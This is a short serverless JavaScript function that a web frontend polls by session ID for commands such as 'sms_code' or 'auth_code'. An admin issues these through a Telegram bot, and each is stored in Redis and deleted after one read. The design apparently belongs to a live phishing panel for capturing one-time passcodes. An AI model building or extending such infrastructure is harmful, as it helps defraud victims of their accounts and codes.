/**
 * Poll Command Endpoint
 *
 * The frontend polls this endpoint to check whether the admin has issued
 * a command via the Telegram inline keyboard for the given session.
 *
 * GET /.netlify/functions/pollCommand?sessionId=<id>
 *
 * Returns:
 *   { command: "sms_code" | "auth_code" | ... | null }
 *
 * Once a command is read, it is deleted from Redis so it is consumed only once.
 */

async function getRedis() {
  const url = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;
  if (!url || !token) return null;
  const { Redis } = await import('@upstash/redis');
  return new Redis({ url, token });
}

export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  try {
    const url = new URL(event.rawUrl || `https://x.com${event.path || '/'}?${new URLSearchParams(event.queryStringParameters || {}).toString()}`);
    const sessionId = url.searchParams.get('sessionId');

    if (!sessionId) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Missing sessionId parameter' }),
      };
    }

    let commandData = null;

    const redis = await getRedis();
    if (redis) {
      const raw = await redis.get(`smartbot:${sessionId}`);
      if (raw) {
        commandData = typeof raw === 'string' ? JSON.parse(raw) : raw;
        // Delete after reading so the command is consumed once
        await redis.del(`smartbot:${sessionId}`);
      }
    } else {
      // Fallback: in-memory
      const store = global._smartBotCommands || {};
      if (store[sessionId]) {
        commandData = store[sessionId];
        delete store[sessionId];
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        command: commandData ? commandData.command : null,
        timestamp: commandData ? commandData.timestamp : null,
      }),
    };
  } catch (error) {
    console.error('pollCommand error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Internal server error' }),
    };
  }
};
